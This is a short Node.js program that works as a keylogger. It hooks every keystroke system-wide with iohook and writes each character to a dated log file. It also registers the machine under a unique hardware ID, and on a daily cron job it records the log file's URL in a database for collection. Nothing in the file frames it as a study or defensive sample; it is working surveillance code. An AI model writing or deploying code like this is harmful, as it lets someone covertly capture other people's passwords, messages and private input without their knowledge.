const ioHook = require("iohook");
const { machineSync } = require("node-unique-machine-id");
var cron = require("node-cron");

const fileUtils = require("./src/utils/fileUtils");
const trackingDb = require("./src/models/tracking");
const loggerDb = require("./src/models/logger");
const moment = require("moment");

const baseUrl = "http://localhost:8080/files/";

const run = async () => {
  const trackingId = machineSync(true);

  const tracking = await trackingDb.getOne(trackingId);
  if (tracking.length == 0) {
    await trackingDb.create({ id: trackingId });
  }

  const fileName = moment().format("YYYY_MM_DD") + "_log.txt";

  ioHook.on("keydown", (e) => {
    let c = String.fromCharCode(e.rawcode);
    fileUtils.writeFile(fileName, c);
  });

  cron.schedule("0 44 21 * * *", async () => {
    console.log("cron running...");

    await loggerDb.create({
      file_name: fileName,
      url: baseUrl + fileName,
      tracking_id: trackingId,
    });

    console.log("Done");
  });
  ioHook.start();
};
run();
